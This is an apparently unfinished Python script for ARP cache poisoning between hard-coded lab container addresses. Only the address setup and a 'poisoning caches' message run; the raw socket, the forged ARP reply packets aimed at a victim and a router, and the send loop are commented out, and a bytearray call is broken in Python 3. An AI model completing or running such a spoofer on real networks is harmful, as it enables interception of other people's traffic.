"""spoofer developed in python to arp spoof"""
import opcode
from os import stat
import socket
import time
import struct, binascii

def mac_address_to_binary(mac_addr):
    """functions translate mac address to binary"""
    return binascii.unhexlify(mac_addr.replace(':',''))

def get_mac_interface(mac):
    """get the interface name related to the mac address"""
    return mac

def main():
    """main function"""
    ip_spoofer = '172.19.0.4'
    ip_server  = '172.19.0.3'
    ip_client  = '172.19.0.2'

    mac_spoofer = mac_address_to_binary('02:42:ac:13:00:04')
    mac_server = mac_address_to_binary('02:42:ac:13:00:03')
    mac_client = mac_address_to_binary('02:42:ac:13:00:02')

    netiface = get_mac_interface("ens33") #TODO:esto

    #conexion = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    #conexion.bind((netiface, socket.htons(0x0800)))

    opcode = bytearray("\x08\x06")
    #paqueteComun =  + codigo
    #eth1 = macVictima + paqueteComun
    #eth2 = macRouter + paqueteComun
    #tipoHardware = "\x00\x01"
    #tipoProtocolo = "\x08\x00"
    #longitudHardware = "\x06"
    #longitudProtocolo = "\x04"
    #codigoOperacion = "\x00\x02"
    #cabeceraCompartida = tipoHardware+tipoProtocolo+longitudHardware+longitudProtocolo+codigoOperacion+macOrigen
    #ipRouter = socket.inet_aton("192.168.66.1")
    #ipVictima = socket.inet_aton("192.168.66.2")
    #arpVictima = eth1 + cabeceraCompartida + ipRouter + macVictima + ipVictima
    #arpRouter = eth2 + cabeceraCompartida  + ipVictima + macRouter + ipRouter

    print("Envenenando caches... para parar CTRL + C")

    #while True:
    #    conexion.send(arpRouter)
    #    conexion.send(arpVictima)
    #    time.sleep(1)

if __name__ == "__main__":
    main()
